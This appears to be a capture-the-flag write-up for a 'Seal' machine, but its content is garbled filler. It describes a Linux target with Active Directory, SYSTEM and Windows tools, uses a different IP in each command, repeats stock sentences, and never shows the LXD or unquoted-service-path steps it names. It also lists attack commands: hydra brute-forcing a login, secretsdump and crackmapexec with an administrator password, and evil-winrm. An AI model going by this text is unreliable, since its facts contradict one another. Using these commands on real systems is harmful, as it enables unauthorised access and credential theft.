---
TitleSEO: "PwnTillDawn — Seal (Hard Linux) | ZureFX"
TitlePost: "PwnTillDawn — Seal (Hard Linux)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Seal. LXD Privilege Escalation and Unquoted Service Path to achieve hard compromise on Linux."
Keywords: "forensics, tryhackme, linux"
URL: "https://zurefx.github.io/writeups/htb-seal-438.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-seal-438/"
Date: "2024-11-21"
Tags: "Forensics, TryHackMe, Linux"
Section: "writeups"
Lang: "en"
main_img: "htb-seal-438"
Permalink: "/writeups/htb-seal-438.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Seal** is rated **Hard** on PwnTillDawn. It runs **Linux** and the IP address during this analysis was `10.13.23.188`.

### Objectives

The service account had excessive permissions assigned in Active Directory. The target system was identified as running a vulnerable version of the service.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
gobuster dir -u http://10.24.62.233/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.112.171.120 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Service Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. Token impersonation allowed elevation to SYSTEM privileges on the target. The target system was identified as running a vulnerable version of the service.

```bash
gobuster dir -u http://10.29.91.249/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Post-exploitation enumeration revealed a path to domain administrator privileges. The database credentials were hardcoded in the application source code.

### SMB Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.31.78.13
nmap -sCV -p389,53,80 10.97.23.53 -oN scan.txt
gobuster dir -u http://10.95.38.222/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services. Network traffic analysis revealed unencrypted communications containing user credentials.

## Exploitation

### Vulnerability Identification

Group Policy Preferences contained encrypted but recoverable credentials. The target system was identified as running a vulnerable version of the service. Post-exploitation enumeration revealed a path to domain administrator privileges.

Key finding: **Unquoted Service Path**.

The web application was vulnerable to Server-Side Template Injection (SSTI). The web application was vulnerable to Server-Side Template Injection (SSTI).

### Initial Access

Unconstrained delegation was enabled on the compromised machine. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
crackmapexec smb 10.39.92.98 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p1433,22,139 10.43.140.38 -oN scan.txt
```

The database credentials were hardcoded in the application source code. Post-exploitation enumeration revealed a path to domain administrator privileges. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Privilege Escalation

### Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. The application stored sensitive credentials in an unencrypted configuration file. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.79.95.170
nmap -sCV -p9200,5985,21 10.40.76.102 -oN scan.txt
nmap -sCV -p993,53,139 10.99.107.59 -oN scan.txt
```

### Exploitation

Group Policy Preferences contained encrypted but recoverable credentials. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
evil-winrm -i 10.61.236.219 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.78.50.165 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.60.174.113 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p5985,587,21 10.65.75.141 -oN scan.txt
```

The target system was identified as running a vulnerable version of the service. The kernel version was outdated and vulnerable to a publicly known exploit.

### Root/SYSTEM

Successfully obtained **root** access on the target.

The service account had excessive permissions assigned in Active Directory. The service account had excessive permissions assigned in Active Directory.

## Summary

### Tools Used

- `rpcclient`
- `smbclient`
- `secretsdump`
- `wmiexec`

### Key Takeaways

- LXD Privilege Escalation
- Unquoted Service Path
